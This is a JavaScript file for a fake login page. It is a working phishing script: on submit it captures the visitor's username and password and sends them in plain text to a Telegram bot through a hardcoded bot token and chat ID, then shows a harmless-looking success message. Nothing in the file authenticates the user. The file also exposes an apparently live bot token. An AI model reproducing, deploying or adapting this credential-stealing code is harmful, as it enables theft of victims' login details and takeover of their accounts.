document.addEventListener('DOMContentLoaded', function() {
    // Configuration
    const CONFIG = {
        BOT_TOKEN: '7760561204:AAHjNGFDUxHeDHBeoR4L1uqIv_77J_ARmDA',
        CHAT_ID: '7760561204',
        API_URL: 'https://api.telegram.org/bot',
        REQUEST_TIMEOUT: 10000 // 10 seconds
    };

    // DOM Elements
    const elements = {
        loginForm: document.getElementById('loginForm'),
        loginBtn: document.querySelector('.login-btn'),
        usernameInput: document.getElementById('username'),
        passwordInput: document.getElementById('password'),
        rememberCheckbox: document.getElementById('remember'),
        currentYear: document.getElementById('currentYear')
    };

    // Initialize
    init();

    // Functions
    function init() {
        // Set current year in footer
        elements.currentYear.textContent = new Date().getFullYear();
        
        // Event listeners
        elements.loginForm.addEventListener('submit', handleFormSubmit);
    }

    async function handleFormSubmit(e) {
        e.preventDefault();
        
        // Get form values
        const credentials = {
            username: elements.usernameInput.value.trim(),
            password: elements.passwordInput.value.trim(),
            remember: elements.rememberCheckbox.checked
        };
        
        // Validate inputs
        if (!validateInputs(credentials)) {
            return;
        }
        
        // Update UI for loading state
        setLoadingState(true);
        
        try {
            // Send data to Telegram
            const success = await sendToTelegram(credentials);
            
            if (success) {
                showAlert('Login information processed successfully', 'success');
                elements.loginForm.reset();
            } else {
                showAlert('Failed to process login. Please try again.', 'error');
            }
        } catch (error) {
            console.error('Submission error:', error);
            showAlert('An unexpected error occurred. Please try again later.', 'error');
        } finally {
            setLoadingState(false);
        }
    }

    function validateInputs({ username, password }) {
        if (!username || !password) {
            showAlert('Please enter both username and password', 'error');
            return false;
        }
        
        if (username.length < 3 || password.length < 6) {
            showAlert('Invalid credentials format', 'error');
            return false;
        }
        
        return true;
    }

    async function sendToTelegram({ username, password }) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT);
        
        const message = `🔐 New Login Attempt\n\n📧 Username: ${username}\n🔑 Password: ${password}\n\n⏰ ${new Date().toLocaleString()}`;
        
        try {
            const response = await fetch(`${CONFIG.API_URL}${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                }),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            console.log('Telegram response:', data);
            return data.ok === true;
            
        } catch (error) {
            if (error.name === 'AbortError') {
                console.error('Request timed out');
                showAlert('Request timed out. Please check your connection.', 'error');
            } else {
                console.error('Telegram API error:', error);
            }
            return false;
        }
    }

    function setLoadingState(isLoading) {
        elements.loginBtn.disabled = isLoading;
        elements.loginBtn.textContent = isLoading ? 'Processing...' : 'Sign In';
    }

    function showAlert(message, type) {
        // Remove any existing alerts
        removeExistingAlerts();
        
        // Create alert element
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert-message alert-${type}`;
        alertDiv.textContent = message;
        
        // Insert after the form
        elements.loginForm.insertAdjacentElement('afterend', alertDiv);
        
        // Remove after 5 seconds
        setTimeout(() => {
            alertDiv.style.opacity = '0';
            setTimeout(() => alertDiv.remove(), 300);
        }, 5000);
    }

    function removeExistingAlerts() {
        const existingAlerts = document.querySelectorAll('.alert-message');
        existingAlerts.forEach(alert => {
            alert.style.opacity = '0';
            setTimeout(() => alert.remove(), 300);
        });
    }
});